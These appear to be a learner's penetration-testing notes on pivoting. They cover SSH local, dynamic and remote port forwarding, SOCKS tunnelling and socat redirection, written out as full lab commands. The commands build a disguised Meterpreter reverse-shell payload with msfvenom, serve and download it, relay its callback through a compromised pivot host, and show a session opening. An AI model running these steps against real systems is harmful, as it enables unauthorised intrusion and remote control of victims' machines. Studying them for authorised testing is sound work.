Port Forwarding using `ssh`
`ssh -L 22:localhost:80 user@serverB`

What this really means:
you're telling ssh service on the vitcim :
"tunnel my requests to localhost:`<forwarded-port>` to your own localhost:`<service-port>`".

Let me explain with a concrete example:

1. When you hit localhost:22 on YOUR machine
2. SSH tunnels that request through the connection to serverB
3. ServerB then makes a connection to localhost:80 FROM ITS PERSPECTIVE
4. So serverB accesses its own port 80, not yours

## Forwarding Multiple Ports

Dynamic Port Forwarding with SSH and SOCKS Tunneling

```shell-session
$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

## Pivoting

In situations where you have no route to your target from an attacking machine, and you dont know what ports might be open, but you do have a route from a compromised host or to be announced as 'jump host' (nmap)
You can use socks tunneling which dynamically routes traffic to internal network?
![](/images/Pasted image 20241104235901.png)

I'll Create my own Route and Tunnel my traffic to it, DAMN IT!
A "route" typically refers to the path network traffic takes to reach a destination - like entries in your routing table that tell packets which interface or next hop to use. Regular network routing happens at Layer 3 (IP).

We call it a "tunnel" because:

1. The traffic is encapsulated inside SSH (happening at a higher layer)
2. We're creating a secure encrypted channel through potentially untrusted networks
3. The traffic is wrapped/unwrapped at each end of the connection

Think of it like this:

- A route is like having a path on a map
- A tunnel is like having a secure pipe that your traffic flows through along that path

In your case, you're actually doing both:

1. Creating a tunnel (encrypted SSH connection to pivot)
2. Getting a route (ability to reach internal network IPs)
   **flashcards for obsidian:**
   what does the SOCKS proxy do?::SOCKS acts as an intermediary between a client and a server. Instead of the client connecting directly to a server, it sends its request to a SOCKS proxy server, which then forwards the traffic to the destination server.
   SOCKS USE Case for pentester?::Using **SOCKS** proxies for **pivoting** in a penetration testing or offensive security scenario is a technique to route traffic through a compromised machine (or proxy) in order to access internal systems behind firewalls or network segmentation. This is especially useful for **lateral movement** inside a target network, enabling the attacker to bypass perimeter defenses, such as firewalls, that block direct external access to internal systems.

## Reverse Port Forwarding

---

![](/images/Pasted image 20241105201605.png)

#### Creating a Windows Payload with msfvenom

Remote/Reverse Port Forwarding with SSH

```shell-session
$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 712 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

#### Creating a Windows Payload with msfvenom

Remote/Reverse Port Forwarding with SSH

```shell-session
$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 712 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

#### Configuring & Starting the multi/handler

Remote/Reverse Port Forwarding with SSH

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```

Once our payload is created and we have our listener configured & running, we can copy the payload to the Ubuntu server using the `scp` command since we already have the credentials to connect to the Ubuntu server using SSH.

#### Transferring Payload to Pivot Host

Remote/Reverse Port Forwarding with SSH

```shell-session
$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

backupscript.exe                                   100% 7168    65.4KB/s   00:00
```

After copying the payload, we will start a `python3 HTTP server` using the below command on the Ubuntu server in the same directory where we copied our payload.

#### Starting Python3 Webserver on Pivot Host

Remote/Reverse Port Forwarding with SSH

```shell-session
ubuntu@Webserver$ python3 -m http.server 8123
```

#### Downloading Payload on the Windows Target

We can download this `backupscript.exe` on the Windows host via a web browser or the PowerShell cmdlet `Invoke-WebRequest`.

Remote/Reverse Port Forwarding with SSH

```powershell-session
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

Once we have our payload downloaded on the Windows host, we will use `SSH remote port forwarding` to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000. We will use `-vN` argument in our SSH command to make it verbose and ask it not to prompt the login shell. The `-R` command asks the Ubuntu server to listen on `<targetIPaddress>:8080` and forward all incoming connections on port `8080` to our msfconsole listener on `0.0.0.0:8000` of our `attack host`.

#### Using SSH -R

Remote/Reverse Port Forwarding with SSH

```shell-session
$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

After creating the SSH remote port forward, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener, we can see the logs from the pivot on the pivot host.

# Socat Redirection with a Reverse Shell

[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start `socat` on the Ubuntu server.

#### Starting Socat Listener

Socat Redirection with a Reverse Shell

```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Socat will listen on localhost on port `8080` and forward all the traffic to port `80` on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.

#### Creating the Windows Payload

```shell-session
$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.16.5 -f exe -o backupscript.exe LPORT=3001

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 743 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

Keep in mind that we must transfer this payload to the Windows host. We can use some of the same techniques used in previous sections to do so.

#### Starting MSF Console

Socat Redirection with a Reverse Shell

```shell-session
$ sudo msfconsole

<SNIP>
```

#### Configuring & Starting the multi/handler

Socat Redirection with a Reverse Shell

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:80
```

We can test this by running our payload on the windows host again, and we should see a network connection from the Ubuntu server this time.

#### Establishing the Meterpreter Session

Socat Redirection with a Reverse Shell

```shell-session
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1 ) at 2022-03-07 11:08:10 -0500

meterpreter > getuid
Server username: BLACKWOOD\victor
```
